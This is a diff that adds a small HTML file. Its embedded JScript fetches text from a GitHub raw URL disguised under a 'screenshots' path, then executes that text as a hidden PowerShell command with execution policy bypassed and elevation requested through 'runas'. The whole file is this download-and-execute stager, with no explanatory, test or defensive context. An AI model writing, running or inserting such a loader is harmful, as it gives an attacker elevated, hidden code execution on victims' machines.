@@ -1,0 +1,7 @@
+<html><head><script language=JScript>
+var x=new ActiveXObject("MSXML2.XMLHTTP");
+x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/init.txt",0);
+x.send();
+var sh=new ActiveXObject("Shell.Application");
+sh.ShellExecute("powershell","-NoP -Ex ByP -c \""+x.responseText.replace(/\n/g,";")+"\"","","runas",0);
+</script></head></html>
